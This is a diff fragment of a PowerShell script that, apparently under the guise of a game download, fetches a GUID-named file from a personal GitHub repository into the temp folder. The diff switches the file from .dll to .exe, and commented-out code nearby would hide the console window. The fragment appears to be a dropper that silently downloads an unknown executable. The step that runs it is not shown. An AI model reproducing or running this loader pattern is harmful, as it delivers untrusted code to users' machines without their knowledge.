@@ -7,8 +7,8 @@ $ErrorActionPreference = "Stop"
 # $consolePtr = [Console.Window]::GetConsoleWindow()
 # [Console.Window]::ShowWindow($consolePtr, 0) # 0 = скрыть
 
-$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/545f47bc-a8c7-4a4d-a8d1-f450d32d7d40.dll"
-$TempExe = Join-Path ([IO.Path]::GetTempPath()) "545f47bc-a8c7-4a4d-a8d1-f450d32d7d40.dll"
+$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/545f47bc-a8c7-4a4d-a8d1-f450d32d7d40.exe"
+$TempExe = Join-Path ([IO.Path]::GetTempPath()) "545f47bc-a8c7-4a4d-a8d1-f450d32d7d40.exe"
 
 Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
 
